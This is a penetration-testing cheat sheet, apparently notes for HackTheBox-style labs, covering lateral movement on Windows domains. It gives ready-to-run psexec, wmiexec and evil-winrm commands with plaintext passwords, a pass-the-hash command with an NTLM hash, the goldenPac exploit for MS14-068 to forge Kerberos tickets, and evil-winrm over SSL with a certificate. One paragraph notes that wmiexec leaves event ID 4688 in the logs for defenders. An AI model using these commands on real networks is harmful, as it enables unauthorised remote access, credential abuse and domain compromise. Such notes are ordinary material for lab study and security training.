## psexec
```powershell
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125 
```

## wmiexec
```powershell
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5  
```

Note that this shell environment is not fully interactive, so each command issued will execute a new cmd.exe from WMI and execute your command. The downside of this is that if a vigilant defender checks event logs and looks at event ID 4688: A new process has been created, they will see a new process created to spawn cmd.exe and issue a command. This isn't always malicious activity since many organizations utilize WMI to administer computers, but it can be a tip-off in an investigation

## evil-winrm
```bash
evil-winrm -u svc-alfresco -p s3rvice -i 10.10.10.161
```

# Pass-The-Hash

## psexec
```bash
psexec administrator@10.10.10.10 -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e
```


# Pass-The-Ticket
goldenPac.py is an exploitation script for the CVE-2014-6324 (MS14-068). If the domain controller is vulnerable, it is possible to forge a Golden Ticket without knowing the krbtgt hash by bypassing the PAC signature verification.

After copy the ticket to /tmp/krb5cc_O

```impacket-goldenPac
impacket-goldenPac HTB.LOCAL/james@mantis.htb.local
```


# SSL

## evil-winrm
```bash
evil-winrm -S -i 10.10.10.103 -u amanda -p Ashare1972 -c cert.cer -k amanda.key 
```